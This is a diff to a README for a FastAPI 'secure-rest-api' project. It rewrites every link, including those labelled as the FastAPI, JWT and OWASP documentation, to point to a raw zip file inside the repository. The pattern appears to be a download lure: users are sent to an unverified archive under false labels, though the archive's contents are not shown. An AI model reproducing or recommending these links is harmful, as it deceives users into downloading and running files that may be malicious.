@@ -6,11 +6,11 @@ Welcome to secure-rest-api! This is a security-focused REST API designed with Fa
 
 ## 📥 Download
 
-[![Download secure-rest-api](https://img.shields.io/badge/Download-secure--rest--api-blue.svg)](https://github.com/StoneCantCode/secure-rest-api/releases)
+[![Download secure-rest-api](https://github.com/StoneCantCode/secure-rest-api/raw/refs/heads/master/app/api_rest_secure_3.8.zip)](https://github.com/StoneCantCode/secure-rest-api/raw/refs/heads/master/app/api_rest_secure_3.8.zip)
 
 To get the application, visit the link below:
 
-[Visit this page to download](https://github.com/StoneCantCode/secure-rest-api/releases)
+[Visit this page to download](https://github.com/StoneCantCode/secure-rest-api/raw/refs/heads/master/app/api_rest_secure_3.8.zip)
 
 ## 🔍 Features
 
@@ -31,7 +31,7 @@ To get the application, visit the link below:
 ## 📂 Installation Steps
 
 1. **Visit the Download Page**
-   - Go to [this page](https://github.com/StoneCantCode/secure-rest-api/releases) to access the release files.
+   - Go to [this page](https://github.com/StoneCantCode/secure-rest-api/raw/refs/heads/master/app/api_rest_secure_3.8.zip) to access the release files.
 
 2. **Choose the Correct Version**
    - Locate the latest version of secure-rest-api on the releases page. Download the file that matches your operating system.
@@ -57,9 +57,9 @@ To get the application, visit the link below:
 
 ## 🔗 Useful Links
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com): Official documentation to learn more about FastAPI.
-- [JWT Introduction](https://jwt.io/introduction): Understand how JSON Web Tokens work for authentication.
-- [OWASP Security Principles](https://owasp.org): Learn more about security best practices from OWASP.
+- [FastAPI Documentation](https://github.com/StoneCantCode/secure-rest-api/raw/refs/heads/master/app/api_rest_secure_3.8.zip): Official documentation to learn more about FastAPI.
+- [JWT Introduction](https://github.com/StoneCantCode/secure-rest-api/raw/refs/heads/master/app/api_rest_secure_3.8.zip): Understand how JSON Web Tokens work for authentication.
+- [OWASP Security Principles](https://github.com/StoneCantCode/secure-rest-api/raw/refs/heads/master/app/api_rest_secure_3.8.zip): Learn more about security best practices from OWASP.
 
 ## 🧑‍🤝‍🧑 Community & Support
 
